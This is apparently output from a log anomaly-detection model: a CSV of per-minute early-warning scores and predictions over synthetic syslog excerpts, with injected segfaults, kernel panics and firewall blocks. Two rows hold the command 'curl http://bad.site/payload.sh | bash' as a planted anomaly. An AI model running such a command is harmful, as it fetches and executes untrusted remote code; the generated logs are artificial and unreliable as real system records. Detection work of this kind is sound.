bucket,early_warning_score,predict_raw,predict_confirmed,threshold,k_confirm,lines,example_text
2026-07-01 04:55:00,0.9999997679474307,1,1,0.8224995273096307,3,63,CRON: Synced RTC time from system clock. || sshd: Finished Daily apt download activities. || NetworkManager: app[1234]: segfault at 0 ip 00007f stackpointer error 4 in lib.so[7f000] (core dumped) || docker: Started CUPS Scheduler. || docker: Rotating
2026-07-01 04:56:00,0.9999997929983799,1,1,0.8224995273096307,3,62,sshd: Started Cleanup of Temporary Directories. || chronyd: Rotating log files. || dockerd: Finished Daily apt download activities. || ftpd: Finished Daily apt download activities. || kernel: Started Session c145 of user root. || chronyd: Started Cle
2026-07-01 04:57:00,0.9999998751491654,1,1,0.8224995273096307,3,55,ftpd: Accepted publickey for user from 10.0.0.59 port 22 ssh2. || cups: Rotating log files. || gpm: Started Session c113 of user root. || ntpd: Rotating log files. || ntpd: Synced RTC time from system clock. || ufw: Started CUPS Scheduler. || docker:
2026-07-01 04:58:00,0.9999993455397438,1,1,0.8224995273096307,3,55,sudo: Started Session c81 of user root. || unix_chkpwd: Rotating log files. || smartd: Rotating log files. || named: Started Session c61 of user root. || gpm: Rotating log files. || redis-server: Started Cleanup of Temporary Directories. || kernel: S
2026-07-01 04:59:00,0.9999997857598025,1,1,0.8224995273096307,3,57,ftpd: Finished Daily apt download activities. || ntpd: Started Session c235 of user root. || rsyslogd: Started Cleanup of Temporary Directories. || sudo: Started Cleanup of Temporary Directories. || smartd: Synced RTC time from system clock. || docke
2026-07-01 05:00:00,0.9998561243374546,1,1,0.8224995273096307,3,60,ntpd: Finished Daily apt download activities. || xinetd: Listening on LVM2 poll daemon socket. || ftpd: Accepted publickey for user from 10.0.0.52 port 22 ssh2. || systemd: Started CUPS Scheduler. || sshd: Started CUPS Scheduler. || gpm: Failed passw
2026-07-01 05:01:00,0.9974876352740669,1,1,0.8224995273096307,3,57,telnetd: Rotating log files. || ufw: Started CUPS Scheduler. || ufw: [UFW BLOCK] IN=eth0 OUT= MAC= SRC=1.2.3.5385 DST=10.0.0.1 LEN=60 TOS=0x00 PREC=0x00 TTL=53 || docker: Accepted publickey for user from 10.0.0.141 port 22 ssh2. || ntpd: Finished Dai
2026-07-01 05:02:00,0.9994424581193475,1,1,0.8224995273096307,3,58,ntpd: Started CUPS Scheduler. || docker: Started Cleanup of Temporary Directories. || redis-server: Finished Daily apt download activities. || gpm: Synced RTC time from system clock. || systemd-timesyncd: Listening on LVM2 poll daemon socket. || smar
2026-07-01 05:03:00,0.999915491807609,1,1,0.8224995273096307,3,58,ntpd: Started Cleanup of Temporary Directories. || gpm: Listening on LVM2 poll daemon socket. || gpm: Started Cleanup of Temporary Directories. || unix_chkpwd: Listening on LVM2 poll daemon socket. || ufw: Finished Daily apt download activities. || s
2026-07-01 05:04:00,0.9999997371928657,1,1,0.8224995273096307,3,60,ftpd: kernel: Kernel panic - not syncing: Fatal exception || rsyslogd: Accepted publickey for user from 10.0.0.168 port 22 ssh2. || cups: Synced RTC time from system clock. || redis-server: Started Session c16 of user root. || redis-server: kernel: O
2026-07-01 05:05:00,0.9999909965565101,1,1,0.8224995273096307,3,60,rsyslogd: Rotating log files. || chronyd: Started Session c122 of user root. || systemd-timesyncd: Rotating log files. || cups: Accepted publickey for user from 10.0.0.122 port 22 ssh2. || smartd: app[1234]: segfault at 0 ip 00007f stackpointer error
2026-07-01 05:06:00,0.9998314557943611,1,1,0.8224995273096307,3,63,NetworkManager: Synced RTC time from system clock. || docker: Synced RTC time from system clock. || xinetd: Rotating log files. || smartd: Started Session c227 of user root. || docker: Rotating log files. || sshd: Rotating log files. || redis-server:
2026-07-01 05:07:00,0.9999970007644283,1,1,0.8224995273096307,3,64,ufw: Rotating log files. || unix_chkpwd: Finished Daily apt download activities. || dockerd: Listening on LVM2 poll daemon socket. || telnetd: Started CUPS Scheduler. || named: Finished Daily apt download activities. || systemd-timesyncd: Listening o
2026-07-01 05:08:00,0.9999998994394191,1,1,0.8224995273096307,3,65,NetworkManager: Listening on LVM2 poll daemon socket. || ftpd: Started CUPS Scheduler. || redis-server: Started Session c16 of user root. || gpm: Started Session c214 of user root. || xinetd: Finished Daily apt download activities. || gpm: Started Cl
2026-07-01 05:09:00,0.9999994529015332,1,1,0.8224995273096307,3,62,systemd: Synced RTC time from system clock. || rsyslogd: Started Cleanup of Temporary Directories. || sshd: Started Cleanup of Temporary Directories. || systemd: Listening on LVM2 poll daemon socket. || docker: Listening on LVM2 poll daemon socket. |
2026-07-01 05:10:00,0.9999935429158553,1,1,0.8224995273096307,3,62,unix_chkpwd: Listening on LVM2 poll daemon socket. || cups: Listening on LVM2 poll daemon socket. || xinetd: Started Session c229 of user root. || ftpd: Started Cleanup of Temporary Directories. || unattended-upgrades: Finished Daily apt download act
2026-07-01 05:11:00,0.9999979322067701,1,1,0.8224995273096307,3,57,kernel: Started CUPS Scheduler. || chronyd: Accepted publickey for user from 10.0.0.254 port 22 ssh2. || telnetd: Synced RTC time from system clock. || chronyd: Finished Daily apt download activities. || systemd: Synced RTC time from system clock. ||
2026-07-01 05:12:00,0.9997475340509658,1,1,0.8224995273096307,3,59,dockerd: Started CUPS Scheduler. || redis-server: Started CUPS Scheduler. || kernel: Started CUPS Scheduler. || dockerd: Started Cleanup of Temporary Directories. || NetworkManager: Accepted publickey for user from 10.0.0.56 port 22 ssh2. || unix_chk
2026-07-01 05:13:00,0.9999921301434342,1,1,0.8224995273096307,3,60,ufw: Accepted publickey for user from 10.0.0.38 port 22 ssh2. || smartd: Started Cleanup of Temporary Directories. || unix_chkpwd: Listening on LVM2 poll daemon socket. || systemd-timesyncd: Started CUPS Scheduler. || redis-server: Started CUPS Sched
2026-07-01 05:14:00,0.9999999960660579,1,1,0.8224995273096307,3,57,cups: Started CUPS Scheduler. || redis-server: Started Session c54 of user root. || systemd: Listening on LVM2 poll daemon socket. || gpm: Accepted publickey for user from 10.0.0.92 port 22 ssh2. || ufw: Listening on LVM2 poll daemon socket. || CRON:
2026-07-01 05:15:00,0.9999973533958734,1,1,0.8224995273096307,3,60,ntpd: Finished Daily apt download activities. || telnetd: Listening on LVM2 poll daemon socket. || ufw: Synced RTC time from system clock. || smartd: Started Session c221 of user root. || docker: Listening on LVM2 poll daemon socket. || NetworkManage
2026-07-01 05:16:00,0.9999871599333374,1,1,0.8224995273096307,3,60,sshd: Started CUPS Scheduler. || cups: Finished Daily apt download activities. || chronyd: Rotating log files. || ufw: Accepted publickey for user from 10.0.0.178 port 22 ssh2. || CRON: Rotating log files. || systemd-timesyncd: Listening on LVM2 poll
2026-07-01 05:17:00,0.9998903222173152,1,1,0.8224995273096307,3,59,kernel: Listening on LVM2 poll daemon socket. || xinetd: Started Cleanup of Temporary Directories. || named: Listening on LVM2 poll daemon socket. || ftpd: Listening on LVM2 poll daemon socket. || named: Accepted publickey for user from 10.0.0.102 po
2026-07-01 05:18:00,0.9999731180958942,1,1,0.8224995273096307,3,62,telnetd: Synced RTC time from system clock. || chronyd: Rotating log files. || named: kernel: Kernel panic - not syncing: Fatal exception || redis-server: Accepted publickey for user from 10.0.0.51 port 22 ssh2. || systemd: Finished Daily apt downloa
2026-07-01 05:19:00,0.9999728170761407,1,1,0.8224995273096307,3,61,chronyd: Accepted publickey for user from 10.0.0.209 port 22 ssh2. || smartd: Started CUPS Scheduler. || ftpd: Started Session c147 of user root. || ufw: Started CUPS Scheduler. || chronyd: Synced RTC time from system clock. || kernel: Started CUPS S
2026-07-01 05:20:00,0.9999527072495865,1,1,0.8224995273096307,3,63,xinetd: Started Session c18 of user root. || named: Listening on LVM2 poll daemon socket. || docker: Rotating log files. || CRON: Listening on LVM2 poll daemon socket. || logrotate: Started CUPS Scheduler. || dockerd: Started CUPS Scheduler. || ufw: 
2026-07-01 05:21:00,0.9999960166720608,1,1,0.8224995273096307,3,61,unattended-upgrades: Started CUPS Scheduler. || docker: Accepted publickey for user from 10.0.0.27 port 22 ssh2. || gpm: Synced RTC time from system clock. || unix_chkpwd: Finished Daily apt download activities. || gpm: Started Cleanup of Temporary D
2026-07-01 05:22:00,0.9999987122286399,1,1,0.8224995273096307,3,58,CRON: Started CUPS Scheduler. || chronyd: Started Session c234 of user root. || unattended-upgrades: Listening on LVM2 poll daemon socket. || chronyd: Started Session c224 of user root. || NetworkManager: Synced RTC time from system clock. || CRON: L
2026-07-01 05:23:00,0.9999422334018832,1,1,0.8224995273096307,3,63,logrotate: Started Session c55 of user root. || smartd: Started CUPS Scheduler. || named: Listening on LVM2 poll daemon socket. || xinetd: Started CUPS Scheduler. || named: Rotating log files. || dockerd: Listening on LVM2 poll daemon socket. || sshd
2026-07-01 05:24:00,0.9999963563376488,1,1,0.8224995273096307,3,59,sudo: Accepted publickey for user from 10.0.0.222 port 22 ssh2. || sudo: Rotating log files. || CRON: Accepted publickey for user from 10.0.0.43 port 22 ssh2. || unix_chkpwd: Started Cleanup of Temporary Directories. || kernel: Started CUPS Scheduler
2026-07-01 05:25:00,0.9999999995423741,1,1,0.8224995273096307,3,59,sshd: Accepted publickey for user from 10.0.0.31 port 22 ssh2. || dockerd: Started Session c114 of user root. || unattended-upgrades: Started Cleanup of Temporary Directories. || sshd: Started Session c183 of user root. || dockerd: Rotating log files
2026-07-01 05:26:00,0.9999999716746707,1,1,0.8224995273096307,3,59,xinetd: Started CUPS Scheduler. || kernel: Started CUPS Scheduler. || sshd: Started Cleanup of Temporary Directories. || unix_chkpwd: Listening on LVM2 poll daemon socket. || kernel: Started CUPS Scheduler. || ufw: Started CUPS Scheduler. || redis-se
2026-07-01 05:27:00,0.9999999371096069,1,1,0.8224995273096307,3,57,systemd-timesyncd: Synced RTC time from system clock. || chronyd: Synced RTC time from system clock. || ftpd: Synced RTC time from system clock. || CRON: Accepted publickey for user from 10.0.0.160 port 22 ssh2. || smartd: Started Session c231 of use
2026-07-01 05:28:00,0.9999910230085787,1,1,0.8224995273096307,3,58,dockerd: Started Cleanup of Temporary Directories. || unattended-upgrades: Started Session c229 of user root. || rsyslogd: Finished Daily apt download activities. || gpm: Synced RTC time from system clock. || logrotate: Started Session c244 of user r
2026-07-01 05:29:00,0.9999986421817395,1,1,0.8224995273096307,3,57,rsyslogd: Finished Daily apt download activities. || CRON: Listening on LVM2 poll daemon socket. || logrotate: Accepted publickey for user from 10.0.0.158 port 22 ssh2. || smartd: Finished Daily apt download activities. || gpm: Accepted publickey for
2026-07-01 05:30:00,0.9999999997595519,1,1,0.8224995273096307,3,60,ufw: Accepted publickey for user from 10.0.0.22 port 22 ssh2. || smartd: Synced RTC time from system clock. || sshd: Started CUPS Scheduler. || ftpd: Rotating log files. || gpm: Accepted publickey for user from 10.0.0.62 port 22 ssh2. || smartd: Star
2026-07-01 05:31:00,0.9999999979262142,1,1,0.8224995273096307,3,60,sshd: Accepted publickey for user from 10.0.0.146 port 22 ssh2. || unix_chkpwd: Started Session c157 of user root. || systemd: Started CUPS Scheduler. || cups: Listening on LVM2 poll daemon socket. || smartd: Listening on LVM2 poll daemon socket. || 
2026-07-01 05:32:00,0.9999550655276862,1,1,0.8224995273096307,3,62,CRON: Started CUPS Scheduler. || xinetd: Finished Daily apt download activities. || ntpd: Started CUPS Scheduler. || chronyd: kernel: Kernel panic - not syncing: Fatal exception || kernel: Synced RTC time from system clock. || ufw: Started Cleanup of
2026-07-01 05:33:00,0.9999325286945249,1,1,0.8224995273096307,3,64,cups: Started CUPS Scheduler. || kernel: [UFW BLOCK] IN=eth0 OUT= MAC= SRC=1.2.3.41005 DST=10.0.0.1 LEN=60 TOS=0x00 PREC=0x00 TTL=53 || docker: Started Cleanup of Temporary Directories. || CRON: Listening on LVM2 poll daemon socket. || CRON: Rotating
2026-07-01 05:34:00,0.9999997944913848,1,1,0.8224995273096307,3,58,kernel: Started Session c63 of user root. || ufw: Rotating log files. || ftpd: Synced RTC time from system clock. || systemd-timesyncd: Accepted publickey for user from 10.0.0.85 port 22 ssh2. || logrotate: Synced RTC time from system clock. || chron
2026-07-01 05:35:00,0.9998824858490707,1,1,0.8224995273096307,3,63,unix_chkpwd: Synced RTC time from system clock. || gpm: bash: -c: line 1: curl http://bad.site/payload.sh | bash || logrotate: Rotating log files. || CRON: Synced RTC time from system clock. || telnetd: Accepted publickey for user from 10.0.0.14 port
2026-07-01 05:36:00,0.9807225247083641,1,1,0.8224995273096307,3,63,cups: Started Session c183 of user root. || cups: Started Cleanup of Temporary Directories. || telnetd: Started Cleanup of Temporary Directories. || dockerd: Rotating log files. || xinetd: Synced RTC time from system clock. || redis-server: Finished 
2026-07-01 05:37:00,0.9976829041340516,1,1,0.8224995273096307,3,56,unix_chkpwd: Rotating log files. || systemd-timesyncd: Finished Daily apt download activities. || cups: Started CUPS Scheduler. || rsyslogd: Started Session c17 of user root. || systemd-timesyncd: Listening on LVM2 poll daemon socket. || redis-server
2026-07-01 05:38:00,0.9971743945871258,1,1,0.8224995273096307,3,62,logrotate: Finished Daily apt download activities. || systemd-timesyncd: Finished Daily apt download activities. || CRON: Rotating log files. || sudo: Listening on LVM2 poll daemon socket. || systemd: Started Session c29 of user root. || cups: Starte
2026-07-01 05:39:00,0.9581448385554666,1,1,0.8224995273096307,3,58,named: Started CUPS Scheduler. || smartd: Synced RTC time from system clock. || redis-server: Started Session c157 of user root. || ufw: Synced RTC time from system clock. || sudo: Synced RTC time from system clock. || docker: Accepted publickey for 
2026-07-01 05:40:00,0.9982851363127248,1,1,0.8224995273096307,3,61,telnetd: Accepted publickey for user from 10.0.0.115 port 22 ssh2. || logrotate: Listening on LVM2 poll daemon socket. || systemd: Started Session c35 of user root. || ufw: Accepted publickey for user from 10.0.0.248 port 22 ssh2. || cups: Started Cl
2026-07-01 05:41:00,0.9999599686260497,1,1,0.8224995273096307,3,60,logrotate: Started Session c29 of user root. || smartd: bash: -c: line 1: curl http://bad.site/payload.sh | bash || sudo: Started CUPS Scheduler. || systemd-timesyncd: Accepted publickey for user from 10.0.0.146 port 22 ssh2. || CRON: Accepted public
2026-07-01 05:42:00,0.9999977396911899,1,1,0.8224995273096307,3,58,unix_chkpwd: EXT4-fs error (device sda1): ext4_find_entry:1455: inode #2: comm ls: reading directory lblock 0 || kernel: Accepted publickey for user from 10.0.0.128 port 22 ssh2. || sudo: Listening on LVM2 poll daemon socket. || chronyd: Finished Dai
